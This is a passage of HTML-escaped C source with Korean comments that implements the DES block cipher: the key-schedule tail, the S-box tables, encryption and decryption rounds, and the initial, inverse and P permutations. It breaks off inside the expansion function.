4; j++) { temp1[j] = L[j]; temp2[j] = R[j]; } for (j = 0; j \u0026lt; 4; j++) { L[j] |= L[j] \u0026lt;\u0026lt; v[i]; R[j] |= R[j] \u0026lt;\u0026lt; v[i]; } for (j = 0; j \u0026lt; 3; j++) { L[j] |= (temp1[1 + j] \u0026gt;\u0026gt; 7) \u0026amp; 1; R[j] |= (temp2[1 + j] \u0026gt;\u0026gt; 7) \u0026amp; 1; } L[3] |= ((temp1[0] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 3; R[3] |= ((temp2[0] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 3; sk[i][0] |= ((L[1] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 7; sk[i][0] |= ((L[2] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 6; sk[i][0] |= ((L[1] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 5; sk[i][0] |= (L[2] \u0026amp; 1) \u0026lt;\u0026lt; 4; sk[i][0] |= ((L[0] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 3; sk[i][0] |= ((L[0] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 2; sk[i][0] |= ((L[0] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 1; sk[i][0] |= ((L[3] \u0026gt;\u0026gt; 4) \u0026amp; 1); sk[i][1] |= ((L[1] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 7; sk[i][1] |= ((L[0] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 6; sk[i][1] |= ((L[2] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 5; sk[i][1] |= ((L[1] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 4; sk[i][1] |= ((L[2] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 3; sk[i][1] |= ((L[2] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 2; sk[i][1] |= ((L[1] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 1; sk[i][1] |= ((L[0] \u0026gt;\u0026gt; 4) \u0026amp; 1); sk[i][2] |= ((L[3] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 7; sk[i][2] |= (L[0] \u0026amp; 1) \u0026lt;\u0026lt; 6; sk[i][2] |= (L[1] \u0026amp; 1) \u0026lt;\u0026lt; 5; sk[i][2] |= ((L[0] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 4; sk[i][2] |= ((L[3] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 3; sk[i][2] |= ((L[2] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 2; sk[i][2] |= ((L[1] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 1; sk[i][2] |= ((L[0] \u0026gt;\u0026gt; 6) \u0026amp; 1); sk[i][3] |= ((R[1] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 7; sk[i][3] |= (R[2] \u0026amp; 1) \u0026lt;\u0026lt; 6; sk[i][3] |= ((R[0] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 5; sk[i][3] |= ((R[1] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 4; sk[i][3] |= ((R[2] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 3; sk[i][3] |= ((R[3] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 2; sk[i][3] |= ((R[0] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 1; sk[i][3] |= ((R[1] \u0026gt;\u0026gt; 4) \u0026amp; 1); sk[i][4] |= ((R[2] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 7; sk[i][4] |= ((R[2] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 6; sk[i][4] |= ((R[0] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 5; sk[i][4] |= ((R[2] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 4; sk[i][4] |= (R[1] \u0026amp; 1) \u0026lt;\u0026lt; 3; sk[i][4] |= ((R[2] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 2; sk[i][4] |= ((R[1] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 1; sk[i][4] |= ((R[3] \u0026gt;\u0026gt; 4) \u0026amp; 1); sk[i][5] |= ((R[0] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 7; sk[i][5] |= ((R[3] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 6; sk[i][5] |= ((R[2] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 5; sk[i][5] |= ((R[1] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 4; sk[i][5] |= ((R[2] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 3; sk[i][5] |= (R[0] \u0026amp; 1) \u0026lt;\u0026lt; 2; sk[i][5] |= ((R[0] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 1; sk[i][5] |= ((R[0] \u0026gt;\u0026gt; 4) \u0026amp; 1); } } des.c #include \u0026#34;DES.h\u0026#34; // 초기 전치 함수 static void IP(UBYTE p[8], UBYTE ip[8]); // 역 초기 전치 함수 static void IPinv(UBYTE ip[8], UBYTE c[8]); // f 함수 static void F(UBYTE R[4], UBYTE rk[6], UBYTE res[4]); // 선형 치환 함수 static void P(UBYTE input[4], UBYTE output[4]); // 비트 확장 함 static void E(UBYTE R[4], UBYTE ER[6]); // S-Box 1~8 static UBYTE S1[64] = { 14, 0, 4, 15, 13, 7, 1, 3, 2, 14, 15, 2, 11, 13, 8, 1, 3, 10, 10, 6, 6, 12, 12, 11, 5, 9, 9, 5, 0, 3, 7, 8, 4, 15, 1, 12, 14, 8, 8, 2, 13, 4, 6, 9, 2, 1, 11, 7, 15, 5, 12, 11, 9, 3, 7, 14, 13, 10, 10, 0, 5, 6, 0, 13 }; static UBYTE S2[64] = { 15, 3, 1, 13, 8, 4, 14, 7, 6, 15, 11, 2, 3, 8, 4, 14, 9, 12, 7, 0, 2, 1, 13, 10, 12, 6, 0, 9, 5, 11, 10, 5, 0, 13, 14, 8, 7, 10, 11, 1, 10, 3, 4, 15, 13, 4, 1, 2, 5, 11, 8, 6, 12, 7, 6, 12, 9, 0, 3, 5, 2, 14, 15, 9 }; static UBYTE S3[64] = { 10, 13, 0, 7, 9, 0, 14, 9, 6, 3, 3, 4, 15, 6, 5, 10, 1, 2, 13, 8, 12, 5, 7, 14, 11, 12, 4, 11, 2, 15, 8, 1, 13, 1, 6, 10, 4, 13, 9, 0, 8, 6, 15, 9, 3, 8, 0, 7, 11, 4, 1, 15, 2, 14, 12, 3, 5, 11, 10, 5, 14, 2, 7, 12 }; static UBYTE S4[64] = { 7, 13, 13, 8, 14, 11, 3, 5, 0, 6, 6, 15, 9, 0, 10, 3, 1, 4, 2, 7, 8, 2, 5, 12, 11, 1, 12, 10, 4, 14, 15, 9, 10, 3, 6, 15, 9, 0, 0, 6, 12, 10, 11, 1, 7, 13, 13, 8, 15, 9, 1, 4, 3, 5, 14, 11, 5, 12, 2, 7, 8, 2, 4, 14 }; static UBYTE S5[64] = { 2, 14, 12, 11, 4, 2, 1, 12, 7, 4, 10, 7, 11, 13, 6, 1, 8, 5, 5, 0, 3, 15, 15, 10, 13, 3, 0, 9, 14, 8, 9, 6, 4, 11, 2, 8, 1, 12, 11, 7, 10, 1, 13, 14, 7, 2, 8, 13, 15, 6, 9, 15, 12, 0, 5, 9, 6, 10, 3, 4, 0, 5, 14, 3 }; static UBYTE S6[64] = { 12, 10, 1, 15, 10, 4, 15, 2, 9, 7, 2, 12, 6, 9, 8, 5, 0, 6, 13, 1, 3, 13, 4, 14, 14, 0, 7, 11, 5, 3, 11, 8, 9, 4, 14, 3, 15, 2, 5, 12, 2, 9, 8, 5, 12, 15, 3, 10, 7, 11, 0, 14, 4, 1, 10, 7, 1, 6, 13, 0, 11, 8, 6, 13 }; static UBYTE S7[64] = { 4, 13, 11, 0, 2, 11, 14, 7, 15, 4, 0, 9, 8, 1, 13, 10, 3, 14, 12, 3, 9, 5, 7, 12, 5, 2, 10, 15, 6, 8, 1, 6, 1, 6, 4, 11, 11, 13, 13, 8, 12, 1, 3, 4, 7, 10, 14, 7, 10, 9, 15, 5, 6, 0, 8, 15, 0, 14, 5, 2, 9, 3, 2, 12 }; static UBYTE S8[64] = { 13, 1, 2, 15, 8, 13, 4, 8, 6, 10, 15, 3, 11, 7, 1, 4, 10, 12, 9, 5, 3, 6, 14, 11, 5, 0, 0, 14, 12, 9, 7, 2, 7, 2, 11, 1, 4, 14, 1, 7, 9, 4, 12, 10, 14, 8, 2, 13, 0, 15, 6, 12, 10, 9, 13, 0, 15, 3, 3, 5, 5, 6, 8, 11 }; // DES 암호화 함수 구현 void DES_enc(UBYTE p[8], UBYTE k[7], UBYTE c[8]) { int i; UBYTE sk[16][6] = {0x0, }, ip[8], L[4], R[4], res[4], temp[4]; int round; key_gen(k, sk); IP(p, ip); for(i=0; i\u0026lt;4; ++i) { L[i] = ip[i]; R[i] = ip[4+i]; } for (round=0; round\u0026lt;15; round++) { F(R, sk[round], res); for(i=0; i\u0026lt;4; ++i) { temp[i] = L[i]; L[i] = R[i]; R[i] = temp[i]^res[i]; } } // 15라운드 끝 // 16라운드 F(R, sk[round], res); for(i=0; i\u0026lt;4; ++i) { L[i] = L[i]^res[i]; } for(i=0; i\u0026lt;4; ++i) { ip[i] = L[i]; ip[i+4] = R[i]; } IPinv(ip, c); } // DES 복호화 함수 구현 void DES_dec(UBYTE c[8], UBYTE k[7], UBYTE p[8]) { int i; UBYTE sk[16][6] = {0x0, }, ip[8], L[4], R[4], res[4], temp[4]; int round; key_gen(k, sk); IP(c, ip); for(i=0; i\u0026lt;4; ++i) { L[i] = ip[i]; R[i] = ip[4+i]; } for (round=0; round\u0026lt;15; round++) { F(R, sk[15-round], res); for(i=0; i\u0026lt;4; ++i) { temp[i] = L[i]; L[i] = R[i]; R[i] = temp[i]^res[i]; } } // 15라운드 끝 // 16라운드 F(R, sk[0], res); for(i=0; i\u0026lt;4; ++i) { L[i] = L[i]^res[i]; } for(i=0; i\u0026lt;4; ++i) { ip[i] = L[i]; ip[i+4] = R[i]; } IPinv(ip, p); } // 초기 전치 함수 구현 static void IP(UBYTE p[8], UBYTE ip[8]) { int i; for(i=0; i\u0026lt;8; ++i) ip[i] = 0x0; ip[0] |= ((p[7] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 7; ip[0] |= ((p[6] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 6; ip[0] |= ((p[5] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 5; ip[0] |= ((p[4] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 4; ip[0] |= ((p[3] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 3; ip[0] |= ((p[2] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 2; ip[0] |= ((p[1] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 1; ip[0] |= ((p[0] \u0026gt;\u0026gt; 6) \u0026amp; 1); ip[1] |= ((p[7] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 7; ip[1] |= ((p[6] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 6; ip[1] |= ((p[5] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 5; ip[1] |= ((p[4] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 4; ip[1] |= ((p[3] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 3; ip[1] |= ((p[2] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 2; ip[1] |= ((p[1] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 1; ip[1] |= ((p[0] \u0026gt;\u0026gt; 4) \u0026amp; 1); ip[2] |= ((p[7] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 7; ip[2] |= ((p[6] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 6; ip[2] |= ((p[5] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 5; ip[2] |= ((p[4] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 4; ip[2] |= ((p[3] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 3; ip[2] |= ((p[2] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 2; ip[2] |= ((p[1] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 1; ip[2] |= ((p[0] \u0026gt;\u0026gt; 2) \u0026amp; 1); ip[3] |= (p[7] \u0026amp; 1) \u0026lt;\u0026lt; 7; ip[3] |= (p[6] \u0026amp; 1) \u0026lt;\u0026lt; 6; ip[3] |= (p[5] \u0026amp; 1) \u0026lt;\u0026lt; 5; ip[3] |= (p[4] \u0026amp; 1) \u0026lt;\u0026lt; 4; ip[3] |= (p[3] \u0026amp; 1) \u0026lt;\u0026lt; 3; ip[3] |= (p[2] \u0026amp; 1) \u0026lt;\u0026lt; 2; ip[3] |= (p[1] \u0026amp; 1) \u0026lt;\u0026lt; 1; ip[3] |= (p[0] \u0026amp; 1); ip[4] |= ((p[7] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 7; ip[4] |= ((p[6] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 6; ip[4] |= ((p[5] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 5; ip[4] |= ((p[4] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 4; ip[4] |= ((p[3] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 3; ip[4] |= ((p[2] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 2; ip[4] |= ((p[1] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 1; ip[4] |= ((p[0] \u0026gt;\u0026gt; 7) \u0026amp; 1); ip[5] |= ((p[7] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 7; ip[5] |= ((p[6] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 6; ip[5] |= ((p[5] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 5; ip[5] |= ((p[4] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 4; ip[5] |= ((p[3] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 3; ip[5] |= ((p[2] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 2; ip[5] |= ((p[1] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 1; ip[5] |= ((p[0] \u0026gt;\u0026gt; 5) \u0026amp; 1); ip[6] |= ((p[7] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 7; ip[6] |= ((p[6] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 6; ip[6] |= ((p[5] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 5; ip[6] |= ((p[4] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 4; ip[6] |= ((p[3] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 3; ip[6] |= ((p[2] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 2; ip[6] |= ((p[1] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 1; ip[6] |= ((p[0] \u0026gt;\u0026gt; 3) \u0026amp; 1); ip[7] |= ((p[7] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 7; ip[7] |= ((p[6] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 6; ip[7] |= ((p[5] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 5; ip[7] |= ((p[4] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 4; ip[7] |= ((p[3] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 3; ip[7] |= ((p[2] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 2; ip[7] |= ((p[1] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 1; ip[7] |= ((p[0] \u0026gt;\u0026gt; 1) \u0026amp; 1); } // 역 초기 전치 함수 구현 static void IPinv(UBYTE ip[8], UBYTE c[8]) { int i; for(i=0; i\u0026lt;8; ++i) c[i] = 0x0; c[0] |= ((ip[4] ) \u0026amp; 1) \u0026lt;\u0026lt; 7; c[0] |= ((ip[0] ) \u0026amp; 1) \u0026lt;\u0026lt; 6; c[0] |= ((ip[5] ) \u0026amp; 1) \u0026lt;\u0026lt; 5; c[0] |= ((ip[1] ) \u0026amp; 1) \u0026lt;\u0026lt; 4; c[0] |= ((ip[6] ) \u0026amp; 1) \u0026lt;\u0026lt; 3; c[0] |= ((ip[2] ) \u0026amp; 1) \u0026lt;\u0026lt; 2; c[0] |= ((ip[7] ) \u0026amp; 1) \u0026lt;\u0026lt; 1; c[0] |= ((ip[3] ) \u0026amp; 1); c[1] |= ((ip[4] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 7; c[1] |= ((ip[0] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 6; c[1] |= ((ip[5] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 5; c[1] |= ((ip[1] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 4; c[1] |= ((ip[6] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 3; c[1] |= ((ip[2] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 2; c[1] |= ((ip[7] \u0026gt;\u0026gt; 1) \u0026amp; 1) \u0026lt;\u0026lt; 1; c[1] |= ((ip[3] \u0026gt;\u0026gt; 1) \u0026amp; 1); c[2] |= ((ip[4] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 7; c[2] |= ((ip[0] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 6; c[2] |= ((ip[5] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 5; c[2] |= ((ip[1] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 4; c[2] |= ((ip[6] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 3; c[2] |= ((ip[2] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 2; c[2] |= ((ip[7] \u0026gt;\u0026gt; 2) \u0026amp; 1) \u0026lt;\u0026lt; 1; c[2] |= ((ip[3] \u0026gt;\u0026gt; 2) \u0026amp; 1); c[3] |= ((ip[4] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 7; c[3] |= ((ip[0] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 6; c[3] |= ((ip[5] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 5; c[3] |= ((ip[1] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 4; c[3] |= ((ip[6] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 3; c[3] |= ((ip[2] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 2; c[3] |= ((ip[7] \u0026gt;\u0026gt; 3) \u0026amp; 1) \u0026lt;\u0026lt; 1; c[3] |= ((ip[3] \u0026gt;\u0026gt; 3) \u0026amp; 1); c[4] |= ((ip[4] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 7; c[4] |= ((ip[0] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 6; c[4] |= ((ip[5] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 5; c[4] |= ((ip[1] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 4; c[4] |= ((ip[6] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 3; c[4] |= ((ip[2] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 2; c[4] |= ((ip[7] \u0026gt;\u0026gt; 4) \u0026amp; 1) \u0026lt;\u0026lt; 1; c[4] |= ((ip[3] \u0026gt;\u0026gt; 4) \u0026amp; 1); c[5] |= ((ip[4] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 7; c[5] |= ((ip[0] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 6; c[5] |= ((ip[5] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 5; c[5] |= ((ip[1] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 4; c[5] |= ((ip[6] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 3; c[5] |= ((ip[2] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 2; c[5] |= ((ip[7] \u0026gt;\u0026gt; 5) \u0026amp; 1) \u0026lt;\u0026lt; 1; c[5] |= ((ip[3] \u0026gt;\u0026gt; 5) \u0026amp; 1); c[6] |= ((ip[4] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 7; c[6] |= ((ip[0] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 6; c[6] |= ((ip[5] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 5; c[6] |= ((ip[1] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 4; c[6] |= ((ip[6] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 3; c[6] |= ((ip[2] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 2; c[6] |= ((ip[7] \u0026gt;\u0026gt; 6) \u0026amp; 1) \u0026lt;\u0026lt; 1; c[6] |= ((ip[3] \u0026gt;\u0026gt; 6) \u0026amp; 1); c[7] |= ((ip[4] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 7; c[7] |= ((ip[0] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 6; c[7] |= ((ip[5] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 5; c[7] |= ((ip[1] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 4; c[7] |= ((ip[6] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 3; c[7] |= ((ip[2] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 2; c[7] |= ((ip[7] \u0026gt;\u0026gt; 7) \u0026amp; 1) \u0026lt;\u0026lt; 1; c[7] |= ((ip[3] \u0026gt;\u0026gt; 7) \u0026amp; 1); } // f 함수 구현 static void F(UBYTE R[4], UBYTE rk[6], UBYTE res[4]) { int i; UBYTE ER[6], S_in[8], S_out[8], P_in[4]; // expansion E(R, ER); // xor for(i=0; i\u0026lt;6; ++i) ER[i] ^= rk[i]; // S-box computation S_in[0] = (ER[0]\u0026amp;0xfc)\u0026gt;\u0026gt;2; S_in[1] = ((ER[0]\u0026amp;0x03)\u0026lt;\u0026lt;4) | ((ER[1] \u0026amp; 0xf0)\u0026gt;\u0026gt;4); S_in[2] = ((ER[1]\u0026amp;0x0f)\u0026lt;\u0026lt;2) | ((ER[2] \u0026amp; 0xc0)\u0026gt;\u0026gt;6); S_in[3] = ER[2] \u0026amp; 0x3f; S_in[4] = (ER[3]\u0026amp;0xfc)\u0026gt;\u0026gt;2; S_in[5] = ((ER[3]\u0026amp;0x03)\u0026lt;\u0026lt;4) | ((ER[4] \u0026amp; 0xf0)\u0026gt;\u0026gt;4); S_in[6] = ((ER[4]\u0026amp;0x0f)\u0026lt;\u0026lt;2) | ((ER[5] \u0026amp; 0xc0)\u0026gt;\u0026gt;6); S_in[7] = ER[5] \u0026amp; 0x3f; S_out[0] = S1[S_in[0]]; S_out[1] = S2[S_in[1]]; S_out[2] = S3[S_in[2]]; S_out[3] = S4[S_in[3]]; S_out[4] = S5[S_in[4]]; S_out[5] = S6[S_in[5]]; S_out[6] = S7[S_in[6]]; S_out[7] = S8[S_in[7]]; // P computation for(i=0; i\u0026lt;4; ++i) P_in[i] = (S_out[2*i]\u0026lt;\u0026lt;4) | S_out[2*i+1]; P(P_in, res); } // 선형 치환 함수 구현 static void P(UBYTE input[4], UBYTE output[4]) { int i; for(i=0; i\u0026lt;4; i++) output[i]=0; output[0] |=((input[1]) \u0026amp; 1) \u0026lt;\u0026lt; 7; output[0] |=((input[0]\u0026gt;\u0026gt;1) \u0026amp; 1) \u0026lt;\u0026lt; 6; output[0] |=((input[2]\u0026gt;\u0026gt;4) \u0026amp; 1) \u0026lt;\u0026lt; 5; output[0] |=((input[2]\u0026gt;\u0026gt;3) \u0026amp; 1) \u0026lt;\u0026lt; 4; output[0] |=((input[3]\u0026gt;\u0026gt;3) \u0026amp; 1) \u0026lt;\u0026lt; 3; output[0] |=((input[1]\u0026gt;\u0026gt;4) \u0026amp; 1) \u0026lt;\u0026lt; 2; output[0] |=((input[3]\u0026gt;\u0026gt;4) \u0026amp; 1) \u0026lt;\u0026lt; 1; output[0] |=((input[2]\u0026gt;\u0026gt;7) \u0026amp; 1); output[1] |=((input[0]\u0026gt;\u0026gt;7) \u0026amp; 1) \u0026lt;\u0026lt; 7; output[1] |=((input[1]\u0026gt;\u0026gt;1) \u0026amp; 1) \u0026lt;\u0026lt; 6; output[1] |=((input[2]\u0026gt;\u0026gt;1) \u0026amp; 1) \u0026lt;\u0026lt; 5; output[1] |=((input[3]\u0026gt;\u0026gt;6) \u0026amp; 1) \u0026lt;\u0026lt; 4; output[1] |=((input[0]\u0026gt;\u0026gt;3) \u0026amp; 1) \u0026lt;\u0026lt; 3; output[1] |=((input[2]\u0026gt;\u0026gt;6) \u0026amp; 1) \u0026lt;\u0026lt; 2; output[1] |=((input[3]\u0026gt;\u0026gt;1) \u0026amp; 1) \u0026lt;\u0026lt; 1; output[1] |=((input[1]\u0026gt;\u0026gt;6) \u0026amp; 1); output[2] |=((input[0]\u0026gt;\u0026gt;6) \u0026amp; 1) \u0026lt;\u0026lt; 7; output[2] |=((input[0]) \u0026amp; 1) \u0026lt;\u0026lt; 6; output[2] |=((input[2]) \u0026amp; 1) \u0026lt;\u0026lt; 5; output[2] |=((input[1]\u0026gt;\u0026gt;2) \u0026amp; 1) \u0026lt;\u0026lt; 4; output[2] |=((input[3]) \u0026amp; 1) \u0026lt;\u0026lt; 3; output[2] |=((input[3]\u0026gt;\u0026gt;5) \u0026amp; 1) \u0026lt;\u0026lt; 2; output[2] |=((input[0]\u0026gt;\u0026gt;5) \u0026amp; 1) \u0026lt;\u0026lt; 1; output[2] |=((input[1]\u0026gt;\u0026gt;7) \u0026amp; 1); output[3] |=((input[2]\u0026gt;\u0026gt;5) \u0026amp; 1) \u0026lt;\u0026lt; 7; output[3] |=((input[1]\u0026gt;\u0026gt;3) \u0026amp; 1) \u0026lt;\u0026lt; 6; output[3] |=((input[3]\u0026gt;\u0026gt;2) \u0026amp; 1) \u0026lt;\u0026lt; 5; output[3] |=((input[0]\u0026gt;\u0026gt;2) \u0026amp; 1) \u0026lt;\u0026lt; 4; output[3] |=((input[2]\u0026gt;\u0026gt;2) \u0026amp; 1) \u0026lt;\u0026lt; 3; output[3] |=((input[1]\u0026gt;\u0026gt;5) \u0026amp; 1) \u0026lt;\u0026lt; 2; output[3] |=((input[0]\u0026gt;\u0026gt;4) \u0026amp; 1) \u0026lt;\u0026lt; 1; output[3] |=((input[3]\u0026gt;\u0026gt;7) \u0026amp; 1); } // 비트 확장 함수 구현 static void E(UBYTE R[4], UBYTE 